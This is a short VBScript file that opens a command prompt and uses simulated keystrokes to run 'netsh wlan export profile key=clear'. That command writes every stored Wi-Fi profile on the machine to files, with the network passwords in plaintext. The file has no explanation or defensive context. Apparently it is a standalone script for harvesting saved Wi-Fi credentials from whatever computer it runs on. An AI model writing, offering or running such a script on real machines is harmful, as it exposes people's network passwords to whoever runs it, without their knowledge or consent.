dim fso
set x=createobject("wscript.shell")
x.run "cmd.exe"
x.sendkeys "netsh wlan export profile key=clear"
x.sendkeys "{ENTER}"